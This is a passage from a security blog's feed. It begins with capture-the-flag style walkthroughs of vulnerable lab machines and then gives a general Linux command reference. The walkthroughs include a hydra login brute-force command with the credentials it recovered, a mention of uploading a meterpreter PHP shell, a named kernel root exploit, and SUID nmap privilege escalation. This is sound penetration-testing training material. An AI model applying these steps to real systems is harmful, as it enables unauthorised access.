CSS!&rsquo;&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;This page was produced in 0.0002 seconds.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br /&gt;&lt;br /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>
If we see, there are three fields, input_username,input_password and path, using hydra to bruteforce, do read hydra documentation on http-post-form
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -l robhubbard -P pass.txt 192.168.1.3 http-post-form &ldquo;/commodore64/index.php:input_username=^USER^&amp;input_password=^PASS^&amp;path=:login&rdquo;
</span><span class='line'>[80][http-post-form] host: 192.168.1.3   login: robhubbard   password: mos6518</span></code></pre></td></tr></table></div></figure>
we have the username and password, we can login to the PHPFM 0.2.3.</p>

<p>Once, logged in, we can upload php meterpreter shell generated using msfvenom. Once login, the uname is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Linux sidney 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure>
and os-release is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@sidney:/var/www/html/commodore64$ cat /etc/os-release
</span><span class='line'>cat /etc/os-release
</span><span class='line'>NAME=&ldquo;Ubuntu&rdquo;
</span><span class='line'>VERSION=&ldquo;16.04 LTS (Xenial Xerus)&rdquo;
</span><span class='line'>ID=ubuntu
</span><span class='line'>ID_LIKE=debian
</span><span class='line'>PRETTY_NAME=&ldquo;Ubuntu 16.04 LTS&rdquo;
</span><span class='line'>VERSION_ID=&ldquo;16.04&rdquo;
</span><span class='line'>HOME_URL=&ldquo;<a href="http://www.ubuntu.com/">http://www.ubuntu.com/</a>&rdquo;
</span><span class='line'>SUPPORT_URL=&ldquo;<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>&rdquo;
</span><span class='line'>BUG_REPORT_URL=&ldquo;<a href="http://bugs.launchpad.net/ubuntu/">http://bugs.launchpad.net/ubuntu/</a>&rdquo;
</span><span class='line'>UBUNTU_CODENAME=xenial</span></code></pre></td></tr></table></div></figure>
This version of ubuntu is affected by doubleput vulnerability Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit. Also, the user rhubbard uses the same password and have the sudo privileges to run all.
</li>
<li>Mr. Robot:1:</p>

<p>It was quite easy, you get first key out of the three key from the robots.txt file. Also, the login, password could be found from the nikto results. Once logged in, execute a php shell. In the home directory of robot, we will get the md5 sum of the password. Login using that and search for the suid files. Nmap is suid, which can be used for privilege escalation.</li>
<li>Breach 01:
We find a email which specifies .keystore file which is a Java keystore file. more details about the java keystore file can be found on digital ocean blog <a href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores</a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>keytool -list -keystore .keystore
</span><span class='line'>Enter keystore password:<br/>
</span><span class='line'>
</span><span class='line'>Keystore type: JKS
</span><span class='line'>Keystore provider: SUN
</span><span class='line'>
</span><span class='line'>Your keystore contains 1 entry
</span><span class='line'>
</span><span class='line'>tomcat, 20 May, 2016, PrivateKeyEntry,
</span><span class='line'>Certificate fingerprint (SHA1): D5:D2:49:C3:69:93:CC:E5:39:A9:DE:5C:91:DC:F1:26:A6:40:46:53</span></code></pre></td></tr></table></div></figure></li>
</ol></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Linux Essentials]]></title>
    <link href="http://bitvijays.github.io/blog/2014/10/08/linux-essentials/"/>
    <updated>2014-10-08T03:37:48+05:30</updated>
    <id>http://bitvijays.github.io/blog/2014/10/08/linux-essentials</id>
    <content type="html"><![CDATA[<p>This post lists essential commands and concepts which would be helpful to a Linux user. We would cover tools required for programming, system administration. Also, provide some useful tips, tricks and TODO which would help you learn and practice.</p>

<!-- more -->


<p></p>

<ol>
<li>Vi : Powerful Editor:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vi &lt;filename>              - Open a file to edit in Vi editor.
</span><span class='line'>Two modes                  - Command and Insert Mode. All commands below are in command mode.
</span><span class='line'>:q                         - Quit.
</span><span class='line'>:wq                        - Save and close.
</span><span class='line'>:syntax on                 - Turn on Syntax highlighting for C programming and other languages.
</span><span class='line'>:set number                - Turn on the line numbers.
</span><span class='line'>:set nonumber              - Turn off the line numbers.
</span><span class='line'>:set spell spelllang=en_us - Turn spell checking on with spell language as "en_us"
</span><span class='line'>:set nospell               - Turn spell checking off
</span><span class='line'>:set list        - If 'list' is on, whitespace characters are made visible. The default displays "^I" for each tab, and "$" at each EOL (end of line, so trailing whitespace can be seen)
</span><span class='line'>:u                         - Undo one change.
</span><span class='line'>z=                         - If the cursor is on the word ( which is highlighted with spell check), Vim will suggest a list of alternatives that it thinks may be correct.
</span><span class='line'>dd                         - Delete current line. 
</span><span class='line'>d$                         - Delete the text from where your cursor is to the end of the line.
</span><span class='line'>dnd                        - Delete n lines.
</span><span class='line'>yy                         - Yank or copy current line.
</span><span class='line'>y$, yny                    - Similar to delete lines.
</span><span class='line'>p                          - Paste the line in the buffer in to text after the current line.</span></code></pre></td></tr></table></div></figure>
Two configurations files which are important:
<ul>
<li>.vimrc&nbsp;&nbsp;&nbsp;&nbsp;   - Contains optional runtime configuration settings to initialize Vim when it starts. Example: If you want Vim to have syntax on and line numbers on, whenever you open vi, enter syntax on and set number in this file.</li>
<li>.viminfo - Viminfo file stores command-line, search string, input-line history and other stuff. Useful if you want to find out what user has been doing in vi.</li>
</ul> 
<br>  
PS: Both files are present in user home directory.   
<br>
<br>
sed - stream editor in Vi is really very useful. It is also a standalone application.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>:s/test/learn     - would replace test to learn in current line but only first instance.
</span><span class='line'>:s/test/learn/g   - would replace test to learn in current line all the instance.
</span><span class='line'>:s/test/learn/gi  - would replace test (all cases) to learn in current line all the instance.
</span><span class='line'>:%s/test/learn/gi - would replace test to learn in the file (all lines)</span></code></pre></td></tr></table></div></figure>
</li>
<li>Bash configuration files - For Debian/Ubuntu based Systems.
<ol type="i">
<li>~/.bash_profile - Stores user environment variables.</li>
<li>~/.bash_history - contains all the history of the commands.</li>
<li>~/.bash_logout&nbsp;  - contains the command which are executed when bash is exited.</li>
<li>~/.bashrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       - setting of variables for bash.</li>
<li>/etc/profile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - Global system configuration for bash which controls the environmental variables and programs that are to be run when bash is executed. Setting of PATH variable and PS1.</li>
<li>/etc/bashrc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;     - Global system configuration for bash which controls the aliases and functions to be run when bash is executed.</li>
</ol>
<br>
Few important variables
<ol type="i">
<li>HISTSIZE&nbsp;&nbsp;&nbsp;&nbsp; - Controls the number of commands to remember in the history command. The default value is 500.</li>
<li>HISTFILE&nbsp;&nbsp;&nbsp;&nbsp; - Defines the file in which all commands will be logged to. Normally the value for this variable is set to ~/.bash_history. This means that whatever you type in bash will be stored into the value of HISTFILE. It is advisable to leave it undefined, or pipe the output to /dev/null (For privacy reasons).</li>
<li>HISTFILESIZE - Defines the maximum number of commands in ~/.bash_history.</li>
</ol>
</li>
<br>
<li>System Administration
<ul>
<li>Updating Debian Linux System
<ul>
<li>Using apt-get
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get update                 - Sync with Repositories.
</span><span class='line'>apt-get upgrade                - Upgrade installed packages.
</span><span class='line'>apt-get dist-upgrade           - Upgrade distribution packages.
</span><span class='line'>apt-get install "Package Name" - Install the package.
</span><span class='line'>apt-get remove  "Package Name" - Uninstall the package.
</span><span class='line'>apt-get purge   "Package Name" - Removes the package as well as the configurations files.
</span><span class='line'>apt-cache show  "Package name" - Shows what package is used for.
</span><span class='line'>apt-cache search "Keywords"    - Search package name based on keywords.</span></code></pre></td></tr></table></div></figure>
Tip: As mostly, updating takes time, you can club all the commands like "apt-get update && apt-get upgrade && apt-get dist-upgrade && poweroff". 
<br>
<br>
poweroff would shutdown the system after everything is updated.
<br>
<br>
</li>
<li>Using Debian Package Manager dpkg
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dpkg -i &lt;Package>.deb          - Install package.
</span><span class='line'>dpkg -r &lt;Package>              - Removes everything except configuration files.
</span><span class='line'>dpkg -P &lt;Package>              - Removes configurations files too.
</span><span class='line'>dpkg -l                        - Shows the list of all installed packages.
</span><span class='line'>dpkg -L "Package name"         - Shows a list of files installed by specific packages.
</span><span class='line'>dpkg -S "File path"            - Shows the package to which a file belong to.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Adding/Deleting/Modifying Users/Groups
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>adduser &lt;username> : Add a user.
</span><span class='line'>   --gecos GECOS   : adduser won't ask for finger information.
</span><span class='line'>   --system        : Create a system user.
</span><span class='line'>   --quiet         : Suppress informational messages, only show warnings and errors.
</span><span class='line'>   --disabled-login: Do not run passwd to set the password.
</span><span class='line'>deluser &lt;username> : Delete a user.
</span><span class='line'> --remove-home     : Remove the home directory of the user and its mailspool.
</span><span class='line'> --remove-all-files: Remove all files from the system owned by this user. 
</span><span class='line'> --backup          : Backup all files contained in the userhome and the mailspool-file to a file named /$user.tar.bz2 or /$user.tar.gz.
</span><span class='line'>usermod            : Modify a user account.
</span><span class='line'> -e EXPIREDATE     : The date on which the user account will be disabled. The date is specified in the format YYYY-MM-DD.
</span><span class='line'> -L, --lock        : Lock a user's password.
</span><span class='line'> -U, --unlock      : Unlock a user's password.
</span><span class='line'>groupadd           : Create a new group.
</span><span class='line'>groupdel           : Delete a group.
</span><span class='line'>groupmod           : Modify a group definition on the system.</span></code></pre></td></tr></table></div></figure>
</li>
<li>Changing Group/Owner/Permission
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chown              : Change file owner and group.
</span><span class='line'>-reference=RFILE   : use RFILE's owner and group rather than specifying OWNER:GROUP values.
</span><span class='line'>-R, --recursive    : operate on files and directories recursively.
</span><span class='line'>chmod              : change file mode bits.
</span><span class='line'>chgrp              : change group ownership.
</span><span class='line'>SUID bit           : SetUID bit specifies that an executable should run as its owner instead of the user executing it.
</span><span class='line'>                   : SUID is mostly commonly used to run an executable as root, allowing users to perform tasks such as changing their passwords.
</span><span class='line'>         : If there is a flaw in a SUID root executable, you can run arbitrary code as root.</span></code></pre></td></tr></table></div></figure>
</li>

<li>Mounting/Unmounting
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount &lt;device> &lt;dir> : Mount a filesystem.
</span><span class='line'>-r, --read-only      : Mount the filesystem read-only.
</span><span class='line'>unmount {dir|device} : Unmount file systems.</span></code></pre></td></tr></table></div></figure>

Mounting Windows share on Linux

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -t cifs -o username=&lt;share user&gt;,password=&lt;share password&gt;,domain=example.com //WIN_PC_IP/&lt;share name&gt; /mnt</span></code></pre></td></tr></table></div></figure>
</li>
</ul>

<li>Linux Directories
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/home                             : users home directories.
</span><span class='line'>/etc                              : system-wide configuration files.
</span><span class='line'>/bin, /usr/bin, /usr/local/bin    : directories with executable files.
</span><span class='line'>/lib, /usr/lib, /usr/local/lib    : shared libraries needed to support the applications.
</span><span class='line'>/sbin, /usr/sbin, /usr/local/sbin : directories with executables supposed to be run by the Superuser.
</span><span class='line'>/tmp, /var/tmp                    : temporary directories, watch out as /tmp is, by default, cleaned out on each reboot.
</span><span class='line'>/usr/share/doc, /usr/share/man    : complete system documentation.
</span><span class='line'>/dev                              : system device files. In Unix, hardware devices are represented as files.
</span><span class='line'>/proc                             : "virtual" directory containing files through which you can query or tune Linux kernel settings.</span></code></pre></td></tr></table></div></figure>
</li>

<li>Runlevels and Kernel Configurations

<ul type="i">
<li>Linux Boot Process:
<ol>
<li>BIOS starts the boot loader.</li>
<li>Boot loader loads the kernel into memory.</li>
<li>The Kernel mounts disks/partitions and starts the init daemon.</li>
<li>The init daemon starts services based on the runlevel.</li>
</ol></li>
<li>Linux has six runlevels 0-6. Scripts are contained in /etc/rc[0-6,S].d/. Each folder contains the scripts which are followed by either K or S. If the first letter is K that script is not executed. If S, that script is executed. /etc/inittab contains the default run level.
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:0;border-color:#ccc;}
.tg td{font-family:Arial, sans-serif;font-size:14px;padding:4px 4px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#ccc;color:#333;background-color:#fff;}
.tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:4px 4px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;border-color:#ccc;color:#333;background-color:#f0f0f0;}
</style><table class="tg">
  <tr>
    <th class="tg-031e">ID</th>
    <th class="tg-031e">Name</th>
    <th class="tg-031e">Description</th>
  </tr>
  <tr>
    <td class="tg-031e">0</td>
    <td class="tg-031e">Halt</td>
    <td class="tg-031e">Shuts down the system.</td>
  </tr>
  <tr>
    <td class="tg-031e">1</td>
    <td class="tg-031e">Single-user Mode</td>
    <td class="tg-031e">Mode for administrative tasks.</td>
  </tr>
  <tr>
    <td class="tg-031e">2</td>
    <td class="tg-031e">Multi-user Mode</td>
    <td class="tg-031e">Does not configure network interfaces and does not export networks services.</td>
  </tr>
  <tr>
    <td class="tg-031e">3</td>
    <td class="tg-031e">Multi-user Mode with Networking</td>
    <td class="tg-031e">Starts the system normally.</td>
  </tr>
  <tr>
    <td class="tg-031e">4</td>
    <td class="tg-031e">Not used/User-definable</td>
    <td class="tg-031e">For special purposes.</td>
  </tr>
  <tr>
    <td class="tg-031e">5</td>
    <td class="tg-031e">Start system normally with display manager. ( with GUI )</td>
    <td class="tg-031e">Same as runlevel 3 + display manager.</td>
  </tr>
  <tr>
    <td class="tg-031e">6</td>
    <td class="tg-031e">Reboot</td>
    <td class="tg-031e">Reboot the system.</td>
  </tr>
</table>
</li>


<li>Sysctl - configure kernel parameters
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/sysctl.conf                : Contains the variables for kernel parameters.
</span><span class='line'>sysctl -a                       : Display all the kernel parameters
</span><span class='line'>sysctl -w &lt;kernel parameter>    : Change a sysctl setting.
</span><span class='line'>PS: To make permanent changes to the kernel, edit the /etc/sysctl.conf file.</span></code></pre></td></tr></table></div></figure>
</li>
<li> Kernel Modules contained in /lib/modules/$(uname -r)/
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lsmod      : list all loaded modules
</span><span class='line'>modprobe   : load kernel modules
</span><span class='line'>lspci      : list all pci devices
</span><span class='line'>lsusb      : list all usb devices
</span><span class='line'>hal-device : list all the Hardware Abstraction layer devices</span></code></pre></td></tr></table></div></figure></li>
<li>Debian GNU provides a convenient tool to manage runlevels (to control when services are started and shut down); it's called update-rc.d and there are two commonly used invocation methods:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>update-rc.d -f &lt;service name> remove : Disabling a service
</span><span class='line'>update-rc.d &lt;service name> defaults  : Insert links using defaults, start in runlevel 2-5 and stop in runlevels 0,1 and 6.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Programming Related
<ul>
<li>GIT: Version Control System, really useful for tracking your changes.
<br>
TODO: <a href="try.github.com">try.github.com</a> 15 mins tutorial.</li>
<li>gcc - GNU Compile Collection:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>To Compile: gcc -Wall -pedantic -g &lt;C source file> -o &lt;Executable file>
</span><span class='line'>-Wall -pedantic : to check for all the warnings and errors if any.
</span><span class='line'>-g              : to create the symbol file to be used by gdb 
</span><span class='line'>-o              : to create the executable file.</span></code></pre></td></tr></table></div></figure></li>
<li>GDB: GNU debugger
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb -tui &lt;Program name>
</span><span class='line'>-tui              : for listing the source while debugging
</span><span class='line'>b &lt;linenumber>    : to set the break point
</span><span class='line'>p &lt;variable name> : to print the value of the variable
</span><span class='line'>bt                : to print the stack call, mainly useful to find segmentation fault when multiple functions are called.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Gathering Information
<ul>
<li>From Files
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/issue     : Contains the message which is displayed on terminal before login. 
</span><span class='line'>/etc/motd      : Contains the message which is displayed on terminal after login.
</span><span class='line'>/proc/cpuinfo  : provides information about CPU.
</span><span class='line'>/proc/meminfo  : provides information about memory/ RAM.
</span><span class='line'>/proc/version  : provides information about the version of your system.</span></code></pre></td></tr></table></div></figure>
</li>
<li>From Commands
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>last      : shows all the login attempts and the reboot occurred.
</span><span class='line'>lastb     : shows all the bad login attempts. 
</span><span class='line'>lastlog   : shows the list of all the users and when did they login.
</span><span class='line'>id        : print real and effective user and group IDs.
</span><span class='line'>whoami    : whoami - print effective userid.
</span><span class='line'>uname     : print system information.
</span><span class='line'>      -a  : print all the information (Kernel name, nodename, kernel-release, kernel-version, machine, processor, hardware-platform)
</span><span class='line'>pstree    : display a tree of processes.
</span><span class='line'>hostname  : prints out the hostname of the machine which is stored in /etc/hostname.</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Useful Utilites/Commands
<ul>
<li>Copy - Copy files and directories.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp &lt;SOURCE> &lt;DIRECTORY>
</span><span class='line'>-r        : recursive.
</span><span class='line'>-a        : similar to preserve,
</span><span class='line'>-p        : preserve
</span><span class='line'>-v        : verbose.</span></code></pre></td></tr></table></div></figure>
</li>
<li>cut - remove sections from each line of files.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-d        : use DELIM instead of TAB for field delimiter.
</span><span class='line'>-f        : select only these fields.</span></code></pre></td></tr></table></div></figure>
</li>

<li>Pipes
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>\>        : direct normal output.
</span><span class='line'>2>        : direct error output.
</span><span class='line'>&>        : direct all output.</span></code></pre></td></tr></table></div></figure>
</li>

<li>tar - Archiving utility
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-c        : create archive
</span><span class='line'>-t        : list the content of the file
</span><span class='line'>-x        : extract the files
</span><span class='line'>-j        : bzip2 format
</span><span class='line'>-z        : gzip format</span></code></pre></td></tr></table></div></figure>
</li>

<li>find - Searching files
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-user       : File is owned by user uname (numeric user ID allowed).
</span><span class='line'>-group      : File belongs to group gname (numeric group ID allowed).
</span><span class='line'>-size       : File uses n units of space. c/k/M/G: bytes/Kilobytes/Megabytes/Gigabytes.
</span><span class='line'>-name       :
</span><span class='line'>
</span><span class='line'>#Delete empty file and directories:
</span><span class='line'>find -empty -type d -delete
</span><span class='line'>find -empty -type f -delete
</span><span class='line'>
</span><span class='line'>#Find each file in the current directory and tell it's type and grep JPEG files.
</span><span class='line'>find . -type f -exec file {} + | grep JPEG</span></code></pre></td></tr></table></div></figure>
</li>

<li>Some other
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nm-applet : a applet for network manager.
</span><span class='line'>wc        : print newline, word, and byte counts for each file.
</span><span class='line'>   -c     : print the bytes count.
</span><span class='line'>   -l     : print the lines count.
</span><span class='line'>   -w     : print the word count.
</span><span class='line'>sort      : sort lines of text files.
</span><span class='line'>diff      : compare files line by line.
</span><span class='line'>less      : print information one per page.
</span><span class='line'>more      : prints information one per page.
</span><span class='line'>head      : prints first 10 lines
</span><span class='line'>tail      : prints last 10 lines.
</span><span class='line'>whatis    : Provides a one line description of the commands.
</span><span class='line'>which     : locate a command.
</span><span class='line'>whereis   : locate the binary, source, and manual page files for a command.
</span><span class='line'>locate    : find files by name
</span><span class='line'>cal       : Display calendar
</span><span class='line'>date      : Display date. Date command provides multiples options for displaying day and time, very helpful in creating backups with name having time and date.
</span><span class='line'>tr        : Converts from smaller to uppercase. tr stands for translate.
</span><span class='line'>   -d     : delete characters in the text.
</span><span class='line'>tee       : saves output in file as well as forward it.
</span><span class='line'>touch     : Create zero byte files, mainly used for changing the timestamps of the file.
</span><span class='line'>make      : If your program source file name is test.c/cpp, then you can directly write make test, this would compile the test.c/cpp program. Remember this it's a faster way.
</span><span class='line'>stat      : View detailed information about a file, including its name,size, last modified date, and permissions.
</span><span class='line'>uniq      : Report or omit repeated lines.
</span><span class='line'>   -c     : prefix lines by the number of occurrences. (--count)</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li>Special Characters:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>*(asterik)          : A wildcard used to represent zero or more characters in a filename. For example: ls *.txt will list all the names ending in ".txt" such as "file1.txt" and "file23.txt".
</span><span class='line'>?(question mark)    : A wildcard used to represent a single character in a filename. For example ls pic?.jpg would match "pic1.jpg" and "pic2.jpg" but not "pic24.jpg" or "pic.jpg".
</span><span class='line'>[](square brackets) : These are used to specify a range of values to match. For example, "[0-9]" and "[a-z]".
</span><span class='line'>;(semi colon)       : Command separator that can be used to run multiple commands on a single line unconditionally.
</span><span class='line'>&&(double ampersand): Command separator which will only run the second command if the first one is successful (does not return an error.)
</span><span class='line'>||(double pipe)     : Command separator which will only run the second command if the first command failed (had errors). Commonly used to terminate the script if an important command fails.</span></code></pre></td></tr></table></div></figure></li>
<li>Few Important Differences in Commands:
<ol type="i">
<li> su&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :&nbsp; Change users or become superuser. The difference between su - <username> and su <username> is that former su - would switch to the new user directory. It would also change the environment variable according to the changed user.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>su -c "command" : Specify a command that will be invoked by the shell using its -c.</span></code></pre></td></tr></table></div></figure></li>
<li>sudo&nbsp;&nbsp; :&nbsp; execute a command as another user. The difference between su and sudo is 'su' forces you to share your root password to other users whereas 'sudo' makes it possible to execute system commands without root password. 'sudo' lets you use your own password to execute system commands i.e. delegates system responsibility without root password.</li>
